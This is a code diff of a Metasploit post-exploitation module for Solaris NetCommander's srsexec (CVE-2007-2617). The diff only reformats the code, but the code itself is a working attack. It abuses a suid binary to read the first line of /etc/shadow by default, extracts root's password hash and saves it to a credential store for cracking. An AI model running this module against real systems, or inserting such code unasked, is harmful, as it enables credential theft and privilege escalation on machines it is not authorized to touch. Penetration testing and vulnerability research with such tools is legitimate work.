@@ -8,33 +8,38 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Solaris::System
   include Msf::Post::Solaris::Priv
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Solaris srsexec Arbitrary File Reader',
-        'Description'   => %q{ This module exploits a vulnerability in NetCommander 3.2.3 and 3.2.5.
-                               When srsexec is executed in debug (-d) verbose (-v) mode,
-                               the first line of an arbitrary file can be read due to the suid bit set.
-                               The most widely accepted exploitation vector is reading /etc/shadow,
-                               which will reveal root's hash for cracking.},
-        'License'       => MSF_LICENSE,
-        'Author'        => [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Solaris srsexec Arbitrary File Reader',
+        'Description' => %q{
+          This module exploits a vulnerability in NetCommander 3.2.3 and 3.2.5.
+          When srsexec is executed in debug (-d) verbose (-v) mode,
+          the first line of an arbitrary file can be read due to the suid bit set.
+          The most widely accepted exploitation vector is reading /etc/shadow,
+          which will reveal root's hash for cracking.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'h00die', # metasploit module
           'iDefense' # discovery reported anonymously to https://labs.idefense.com
         ],
-        'Platform'      => [ 'solaris' ],
-        'SessionTypes'  => [ 'shell', 'meterpreter' ],
-        'References'    => [
+        'Platform' => [ 'solaris' ],
+        'SessionTypes' => [ 'shell', 'meterpreter' ],
+        'References' => [
           ['CVE', '2007-2617'],
           ['URL', 'https://download.oracle.com/sunalerts/1000443.1.html'],
           ['URL', 'https://www.securityfocus.com/archive/1/468235'],
           ['EDB', '30021'],
           ['BID', '23915']
         ],
-        'DisclosureDate' => '2007-05-07',
-      ))
+        'DisclosureDate' => '2007-05-07'
+      )
+    )
     register_options([
-        OptString.new('FILE', [true, 'File to read the first line of', '/etc/shadow'])
-      ])
+      OptString.new('FILE', [true, 'File to read the first line of', '/etc/shadow'])
+    ])
   end
 
   def suid_bin_path
@@ -48,13 +53,13 @@ class MetasploitModule < Msf::Post
 
     # This ls is based on the guidance in the sun alerts article
     unin = cmd_exec '/usr/bin/ls /opt/SUNWsrspx/bin/UninstallNetConnect.*.sh'
-    unin =~ /UninstallNetConnect\.([\d\.]{11})\.sh/
-    unless $1
+    unin =~ /UninstallNetConnect\.([\d.]{11})\.sh/
+    unless ::Regexp.last_match(1)
       print_error 'NetConnect uninstall not found, either not installed or too new'
       return false
     end
 
-    version = Rex::Version.new($1.split(".").map(&:to_i).join('.'))
+    version = Rex::Version.new(::Regexp.last_match(1).split('.').map(&:to_i).join('.'))
     unless version.between?(Rex::Version.new('3.2.3'), Rex::Version.new('3.2.4'))
       print_error "#{version} is not vulnerable"
       return false
@@ -83,21 +88,22 @@ class MetasploitModule < Msf::Post
     # the next line will start with the last 2 characters from the previous line,
     # followed by the next 18 characters.
 
-    formatted_output = output.scan(/binaries file line: (.+)$/).flatten.map { |line|
+    formatted_output = output.scan(/binaries file line: (.+)$/).flatten.map do |line|
       (line.length == 20) ? line[0..17] : line
-    }.join
+    end.join
 
     return if formatted_output.empty?
 
     print_good("First line of #{datastore['FILE']}: #{formatted_output}")
 
     return unless datastore['FILE'] == '/etc/shadow'
+
     print_good("Adding root's hash to the credential database.")
     credential_data = {
       origin_type: :session,
       session_id: session_db_id,
       workspace_id: myworkspace_id,
-      post_reference_name: self.fullname,
+      post_reference_name: fullname,
       username: formatted_output.split(':')[0],
       private_data: formatted_output.split(':')[1],
       private_type: :nonreplayable_hash
